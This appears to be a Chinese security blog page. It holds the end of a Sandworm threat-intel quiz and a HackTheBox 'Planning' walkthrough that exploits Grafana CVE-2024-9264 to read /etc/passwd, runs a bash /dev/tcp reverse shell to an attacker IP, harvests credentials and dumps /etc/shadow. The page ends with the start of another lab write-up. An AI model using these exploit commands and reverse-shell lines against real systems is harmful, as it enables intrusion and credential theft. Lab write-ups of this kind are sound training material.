<h4 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h4><p><code>What malware/tool was used to carry out data destruction in a compromised environment during the same campaign?</code><br>在同一次活动中，使用了什么恶意软件&#x2F;工具在受损环境中进行数据销毁？<br>task4中我们提了一嘴<br><code>Answer:Caddywiper</code></p>
<h4 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h4><p><code>The malware/tool identified in question 8 also had additional capabilities. What is the Mitre Att&amp;ck ID of the specific technique it could perform in Execution tactic?</code><br>问题 8 中确定的恶意软件&#x2F;工具还具有其他功能。 在执行策略中，它可以执行的具体技术的 Mitre Att&amp;ck ID 是什么？<br>点进去看看<br><img src="/images/Pasted%20image%2020250219160052.png"><br>它还具有解析使用API的能力<br><code>Answer：T1106</code></p>
<h4 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h4><p><code>The Sandworm Team is known to use different tools in their campaigns. They are associated with an auto-spreading malware that acted as a ransomware while having worm-like features .What is the name of this malware?</code><br>众所周知，沙虫团队在其活动中使用不同的工具。 这种恶意软件的名称是什么？<br>直接在<a target="_blank" rel="noopener" href="https://attack.mitre.org/groups/G0034/">sandworm team的主介绍页</a>找吧<br><img src="/images/Pasted%20image%2020250219161020.png"><br><code>Answer:NotPetya</code></p>
<h4 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h4><p><code>What was the Microsoft security bulletin ID for the vulnerability that the malware from question 10 used to spread around the world?</code><br>问微软的公告id是多少，直接Google一下<br>盲目Google展示<br>Google——&gt; NotPetya malware microsoft security report ——&gt;<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/security/blog/2017/10/03/advanced-threat-analytics-security-research-network-technical-analysis-notpetya/">Advanced Threat Analytics security research network technical analysis: NotPetya</a> ——&gt; click <a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/?source=mmpc">Windows Security Blog</a><br><img src="/images/Pasted%20image%2020250219161931.png"></p>
<p>精确Google展示：<br><img src="/images/Pasted%20image%2020250219162011.png"><br>Google ——&gt; using the SMBv1 exploits EternalBlue and EternalRomance microsoft security blog<br><img src="/images/Pasted%20image%2020250219162107.png"></p>
<h4 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h4><p><code>What is the name of the malware/tool used by the group to target modems?</code><br>问攻击调制解压器的tool，直接检索一下modem<br><img src="/images/Pasted%20image%2020250220081433.png"><br><code>Answer:AcidRain</code></p>
<h4 id="Task13"><a href="#Task13" class="headerlink" title="Task13"></a>Task13</h4><p><code>Threat Actors also use non-standard ports across their infrastructure for Operational-Security purposes. On which port did the Sandworm team reportedly establish their SSH server for listening?</code><br>问sshserver端口，直接检索一下<br><img src="/images/Pasted%20image%2020250220081656.png"></p>
<h4 id="Task14"><a href="#Task14" class="headerlink" title="Task14"></a>Task14</h4><p><code>The Sandworm Team has been assisted by another APT group on various operations. Which specific group is known to have collaborated with them?</code><br>问和他们合作的APT组织是哪个<br>在刚刚的检索过程我们可以看到另一个名字：APT44<br><img src="/images/Pasted%20image%2020250220081904.png"><br>但是APT44其实是对SandWorm的另一个称呼，真正与其合作的是APT28<br><code>Answer:28</code></p>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Planning/HackTheBox%E2%80%94%E2%80%94HTB%20Planning%20Writeup/">HackTheBox——HTB Planning Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/planning.png"></p>
<h6 id="记得看吧唧给了一个信息As-is-common-in-real-life-pentests-you-will-start-the-Planning-box-with-credentials-for-the-following-account-admin-0D5oT70Fq13EvB5r"><a href="#记得看吧唧给了一个信息As-is-common-in-real-life-pentests-you-will-start-the-Planning-box-with-credentials-for-the-following-account-admin-0D5oT70Fq13EvB5r" class="headerlink" title="记得看吧唧给了一个信息As is common in real life pentests, you will start the Planning box with credentials for the following account: admin &#x2F; 0D5oT70Fq13EvB5r"></a>记得看吧唧给了一个信息As is common in real life pentests, you will start the Planning box with credentials for the following account: admin &#x2F; 0D5oT70Fq13EvB5r</h6><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)</span><br><span class="line">|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://planning.htb/</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>先加hosts<br>扫一下子域和目录<br>目录没啥，都正常<br>子域出来一个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> ffuf -w /usr/share/payloads/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb/ -H <span class="string">&quot;HOST:FUZZ.planning.htb&quot;</span> -mc all -fw 6</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://planning.htb/</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/payloads/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.planning.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: all</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 6</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 108ms]</span></span><br></pre></td></tr></table></figure>
<p>加到hosts里面</p>
<h3 id="CVE-2024-9264-about-grafana"><a href="#CVE-2024-9264-about-grafana" class="headerlink" title="CVE-2024-9264 about grafana"></a>CVE-2024-9264 about grafana</h3><p>进去是个登录页，可以用给的用户名登录进去<br><img src="/images/planning-1.png"><br>在右上角的<code>?</code>可以看到版本信息<strong>Grafana v11.0.0 (83b9528bce)</strong><br>找一下有没有exploit<br>Google可以找到一个<a target="_blank" rel="noopener" href="https://github.com/nollium/CVE-2024-9264">CVE-2024-9264</a>，git下来试试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb/</span><br><span class="line">[+] Logged <span class="keyword">in</span> as admin:0D5oT70Fq13EvB5r</span><br><span class="line">[+] Reading file: /etc/passwd</span><br><span class="line">[+] Successfully ran duckdb query:</span><br><span class="line">[+] SELECT content FROM read_blob(<span class="string">&#x27;/etc/passwd&#x27;</span>):</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">grafana:x:472:0::/home/grafana:/usr/sbin/nologin</span><br><span class="line">(venv) </span><br></pre></td></tr></table></figure>
<p>嚯，他是真有用<br>但是很遗憾，他不能弹shell，可能是我的姿势不对</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1&quot;</span>  http://grafana.planning.htb/                                                                          </span><br><span class="line">[+] Logged <span class="keyword">in</span> as admin:0D5oT70Fq13EvB5r                                                                                                                                                                            </span><br><span class="line">[+] Executing <span class="built_in">command</span>: /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1                                                                                                                                               </span><br><span class="line">[-] Unexpected response format:                                                                                                                                                                                    </span><br><span class="line">[-] &#123;                                                                                                                                                                                                              </span><br><span class="line">    <span class="string">&quot;results&quot;</span>: &#123;                                                                                                                                                                                                   </span><br><span class="line">        <span class="string">&quot;B&quot;</span>: &#123;                                                                                                                                                                                                     </span><br><span class="line">            <span class="string">&quot;error&quot;</span>: <span class="string">&quot;exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process exited with non-zero exit code=\&quot;2\&quot;: /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1 &gt;/tmp/grafana_cmd_output 2&gt;&amp;1    </span></span><br><span class="line"><span class="string">|\n&quot;</span>,                                                                                                                                                                                                              </span><br><span class="line">            <span class="string">&quot;errorSource&quot;</span>: <span class="string">&quot;&quot;</span>,                                                                                                                                                                                     </span><br><span class="line">            <span class="string">&quot;status&quot;</span>: 500,                                                                                                                                                                                         </span><br><span class="line">            <span class="string">&quot;frames&quot;</span>: []                                                                                                                                                                                           </span><br><span class="line">        &#125;                                                                                                                                                                                                          </span><br><span class="line">    &#125;                                                                                                                                                                                                              </span><br><span class="line">&#125;                                                                                                                                                                                                                  </span><br><span class="line">[+] Successfully ran duckdb query:                                                                                                                                                                                 </span><br><span class="line">[+] SELECT content FROM read_blob(<span class="string">&#x27;/tmp/grafana_cmd_output&#x27;</span>):                                                                                                                                                      </span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)         </span><br></pre></td></tr></table></figure>
<p>没关系，姿势不对可以换个姿势<br>还有一个<a target="_blank" rel="noopener" href="https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit">poc</a>，这可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.2 --reverse-port 9001</span><br><span class="line">[SUCCESS] Login successful!</span><br><span class="line">Reverse shell payload sent successfully!</span><br><span class="line">Set up a netcat listener on 9001</span><br><span class="line"></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9001</span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.129.132.50 56454</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># </span></span><br></pre></td></tr></table></figure>
<p><img src="/images/planning-2.png"><br>但是我们现在在一个docker里面</p>
<h2 id="shell-as-docker-root"><a href="#shell-as-docker-root" class="headerlink" title="shell as docker root"></a>shell as docker root</h2><p>枚举一下看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">╚ Any private information inside environment variables?</span><br><span class="line">AWS_AUTH_SESSION_DURATION=15m                                                                            </span><br><span class="line">HOSTNAME=7ce659d667d7</span><br><span class="line">PWD=/usr/share/grafana</span><br><span class="line">AWS_AUTH_AssumeRoleEnabled=<span class="literal">true</span></span><br><span class="line">GF_PATHS_HOME=/usr/share/grafana</span><br><span class="line">AWS_CW_LIST_METRICS_PAGE_LIMIT=500</span><br><span class="line">HOME=/usr/share/grafana</span><br><span class="line">AWS_AUTH_EXTERNAL_ID=</span><br><span class="line">SHLVL=4</span><br><span class="line">GF_PATHS_PROVISIONING=/etc/grafana/provisioning</span><br><span class="line">GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!</span><br><span class="line">GF_SECURITY_ADMIN_USER=enzo</span><br><span class="line">GF_PATHS_DATA=/var/lib/grafana</span><br><span class="line">GF_PATHS_LOGS=/var/log/grafana</span><br><span class="line">PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">AWS_AUTH_AllowedAuthProviders=default,keys,credentials</span><br><span class="line">OLDPWD=/usr/share/grafana/conf</span><br><span class="line">GF_PATHS_PLUGINS=/var/lib/grafana/plugins</span><br><span class="line">GF_PATHS_CONFIG=/etc/grafana/grafana.ini</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure>
<p>直接ssh登录一下<br><img src="/images/planning-3.png"></p>
<h2 id="shell-as-enzo"><a href="#shell-as-enzo" class="headerlink" title="shell as enzo"></a>shell as enzo</h2><p>枚举枚举</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                       </span><br><span class="line">tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                                                                                                                                  </span><br><span class="line">tcp        0      0 127.0.0.1:36713         0.0.0.0:*               LISTEN      -                                                                                                                                  </span><br><span class="line">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                                                                                                                  </span><br><span class="line">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -      </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Modified interesting files <span class="keyword">in</span> the last 5mins (<span class="built_in">limit</span> 100)                                                                                                                                              </span><br><span class="line">/var/log/landscape/sysinfo.log                                                                                                                                                                                     </span><br><span class="line">/var/log/wtmp                                                                                            </span><br><span class="line">/var/log/laurel/audit.log.2                                                                                                                                                                                        </span><br><span class="line">/var/log/laurel/audit.log.1                                                                                                                                                                                        </span><br><span class="line">/var/log/laurel/audit.log                                                                                                                                                                                          </span><br><span class="line">/var/log/kern.log                                                                                                                                                                                                  </span><br><span class="line">/var/log/lastlog                                                                                                                                                                                                   </span><br><span class="line">/var/log/nginx/access.log                                                                                </span><br><span class="line">/var/log/syslog                                                                                          </span><br><span class="line">/var/log/journal/3b0d524c67754eefbd5162346e0e4a60/system@787bac490fbe4ba2b0f845a6b33628e9-000000000000f160-000634d18527684f.journal                                                                                </span><br><span class="line">/var/log/journal/3b0d524c67754eefbd5162346e0e4a60/system.journal                                         </span><br><span class="line">/var/log/journal/3b0d524c67754eefbd5162346e0e4a60/user-1000.journal                                      </span><br><span class="line">/var/log/journal/3b0d524c67754eefbd5162346e0e4a60/user-1000@de77f415fdca4c968b7aa6b7a144ef98-000000000000f00f-0006347398729b16.journal                                                                             </span><br><span class="line">/var/log/auth.log                                                                                        </span><br><span class="line">/home/enzo/.gnupg/trustdb.gpg                                                                            </span><br><span class="line">/home/enzo/.gnupg/pubring.kbx                                                                            </span><br><span class="line">/tmp/YvZsUUfEXayH6lLj.stderr                                                                             </span><br><span class="line">/tmp/YvZsUUfEXayH6lLj.stdout                                                                             </span><br><span class="line">/opt/crontabs/crontab.db</span><br></pre></td></tr></table></figure>
<p>先把8000转发出来<br><img src="/images/planning-4.png"><br>有是一个登录页，试了现有的不行，把那个db也拿出来<br><img src="/images/planning-5.png"><br>试一下<br><strong>root:P4ssw0rdS0pRi0T3c</strong><br>登录进来了<br>他好像可以加命令<br><img src="/images/planning-6.png"><br>加一个试试<br><img src="/images/planning-7.png"><br><img src="/images/planning-8.png"><br>got root</p>
<h2 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$y$j9T$6FXR7mi4BgmaZ7AoBiO470<span class="variable">$CBrVTY4d7EK5JUjv8Gc2xjGVxYIr14TUCRkgFY0YvB7</span>:20147:0:99999:7:::</span><br><span class="line">daemon:*:20135:0:99999:7:::</span><br><span class="line">bin:*:20135:0:99999:7:::</span><br><span class="line">sys:*:20135:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:20135:0:99999:7:::</span><br><span class="line">games:*:20135:0:99999:7:::</span><br><span class="line">man:*:20135:0:99999:7:::</span><br><span class="line">lp:*:20135:0:99999:7:::</span><br><span class="line">mail:*:20135:0:99999:7:::</span><br><span class="line">news:*:20135:0:99999:7:::</span><br><span class="line">uucp:*:20135:0:99999:7:::</span><br><span class="line">proxy:*:20135:0:99999:7:::</span><br><span class="line">www-data:*:20135:0:99999:7:::</span><br><span class="line">backup:*:20135:0:99999:7:::</span><br><span class="line">list:*:20135:0:99999:7:::</span><br><span class="line">irc:*:20135:0:99999:7:::</span><br><span class="line">_apt:*:20135:0:99999:7:::</span><br><span class="line">nobody:*:20135:0:99999:7:::</span><br><span class="line">systemd-network:!*:20135::::::</span><br><span class="line">systemd-timesync:!*:20135::::::</span><br><span class="line">messagebus:!:20135::::::</span><br><span class="line">systemd-resolve:!*:20135::::::</span><br><span class="line">pollinate:!:20135::::::</span><br><span class="line">polkitd:!*:20135::::::</span><br><span class="line">syslog:!:20135::::::</span><br><span class="line">uuidd:!:20135::::::</span><br><span class="line">tcpdump:!:20135::::::</span><br><span class="line">tss:!:20135::::::</span><br><span class="line">landscape:!:20135::::::</span><br><span class="line">fwupd-refresh:!*:20135::::::</span><br><span class="line">usbmux:!:20147::::::</span><br><span class="line">sshd:!:20147::::::</span><br><span class="line">enzo:$y$j9T<span class="variable">$D</span>.g0svThdX4dAVCvkaUz3.<span class="variable">$jQKKPCGVxCt3NiPX9fCUSzSWXg8V2V6xKvGyhv2yiX</span>.:20147:0:99999:7:::</span><br><span class="line">dnsmasq:!:20147::::::</span><br><span class="line">lxd:!:20147::::::</span><br><span class="line">mysql:!:20147::::::</span><br><span class="line">_laurel:!:20181::::::</span><br><span class="line">dhcpcd:!:20213::::::</span><br></pre></td></tr></table></figure>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/">HackTheBox——HTB Support Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/support.png"></p>
<h2 id="nmap-and-other-enum"><a href="#nmap-and-other-enum" class="headerlink" title="nmap and other enum"></a>nmap and other enum</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49701/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49735/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-04-03T02:17:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 103.34 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先加一下hosts</p>
